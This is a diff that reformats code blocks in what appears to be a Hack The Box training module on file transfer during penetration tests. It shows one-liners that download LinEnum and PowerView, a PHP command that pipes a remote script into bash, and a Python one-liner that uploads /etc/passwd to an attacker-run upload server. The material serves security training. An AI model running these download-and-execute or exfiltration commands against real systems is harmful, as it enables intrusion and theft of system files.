@@ -16,15 +16,13 @@ Python is a popular programming language. Currently, version 3 is supported, but
 
 #### Python 2 - Download
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
 ```
 
 #### Python 3 - Download
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
 ```
 
@@ -40,8 +38,7 @@ In the following example, we will use the PHP [file\_get\_contents() module](htt
 
 #### PHP Download with File\_get\_contents()
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
 ```
 
@@ -49,8 +46,7 @@ An alternative to `file_get_contents()` and `file_put_contents()` is the [fopen(
 
 #### PHP Download with Fopen()
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
 fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
 ```
@@ -61,8 +57,7 @@ We can also send the downloaded content to a pipe instead, similar to the filele
 
 #### PHP Download a File and Pipe it to Bash
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 ```
 
@@ -78,8 +73,7 @@ hiimeins@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/re
 
 #### Ruby - Download a File
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
 ```
 
@@ -87,8 +81,7 @@ hiimeins@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::H
 
 #### Perl - Download a File
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
 ```
 
@@ -100,8 +93,7 @@ JavaScript is a scripting or programming language that allows you to implement c
 
 The following JavaScript code is based on [this](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) post, and we can download a file using it. We'll create a file called `wget.js` and save the following content:
 
-```
-        javascript
+```javascript
 var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
 WinHttpReq.Send();
@@ -116,8 +108,7 @@ We can use the following command from a Windows command prompt or PowerShell ter
 
 #### Download a File Using JavaScript and cscript.exe
 
-```
-        cmd
+```bat
 C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
 ```
 
@@ -148,8 +139,7 @@ We can use the following command from a Windows command prompt or PowerShell ter
 
 #### Download a File Using VBScript and cscript.exe
 
-```
-        cmd
+```bat
 C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
 ```
 
@@ -161,8 +151,7 @@ If we want to upload a file, we need to understand the functions in a particular
 
 #### Starting the Python uploadserver Module
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 -m uploadserver 
 
 File upload available at /upload
@@ -171,15 +160,13 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 #### Uploading a File Using a Python One-liner
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
 ```
 
 Let's divide this one-liner into multiple lines to understand each piece better.
 
-```
-        python
+```python
 # To use the requests function, we need to import the module first.
 import requests 
 
